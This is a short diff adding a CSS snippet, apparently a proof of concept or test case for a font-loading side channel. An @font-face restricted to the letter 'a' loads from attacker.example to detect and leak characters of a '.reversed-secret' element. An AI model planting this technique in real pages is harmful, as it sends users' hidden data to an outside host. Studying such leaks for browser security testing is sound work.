@@ -1,0 +1,13 @@
+@font-face {
+  font-family: "FirefoxReversedLeak";
+  src: url("https://attacker.example/firefox-reversed.woff2");
+  unicode-range: U+0061;
+}
+
+.reversed-secret {
+  direction: rtl;
+  unicode-bidi: bidi-override;
+  width: 8ch;
+  overflow: hidden;
+  font-family: "FirefoxReversedLeak";
+}
